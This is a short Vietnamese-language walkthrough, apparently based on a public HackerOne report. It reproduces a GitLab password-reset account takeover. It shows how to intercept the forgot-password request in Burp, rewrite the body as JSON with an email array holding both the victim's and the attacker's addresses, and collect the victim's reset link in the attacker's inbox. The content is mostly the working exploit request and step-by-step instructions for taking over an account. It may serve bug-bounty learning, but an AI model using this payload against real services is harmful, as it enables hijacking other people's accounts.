# https://hackerone.com/reports/2293343
---

### 🔥 **Cách làm "**

#### 🔧 Bước 1:

Truy cập form "Forgot Password" → nhập `victim@gmail.com` → submit → **Intercept bật sẵn trong Burp**.

#### 🔧 Bước 2:

Trong tab **Intercept**, bạn sẽ thấy payload kiểu như:

```
POST /users/password HTTP/1.1
Host: gitlab.com
Content-Type: application/x-www-form-urlencoded

user[email]=victim@gmail.com
```

#### 🔧 Bước 3: thay thế `user[email]=victim@gmail.com` -> `{ "user": { ....}}` như bên dưới.

**Sửa trực tiếp** nội dung payload thành kiểu JSON thủ công:

```
POST /users/password HTTP/1.1
Host: gitlab.com
Content-Type: application/json

{
  "user": {
    "email": [
      "victim@gmail.com",
      "attacker@gmail.com"
    ]
  }
}
```

> Lưu ý: Khi sửa sang JSON, bu **phải thay Content-Type từ `x-www-form-urlencoded` → `application/json`** để backend parse đúng.

#### ✅ Sau đó:

* **Forward request**
* Check email của attacker → có reset link → takeover như thường.

---

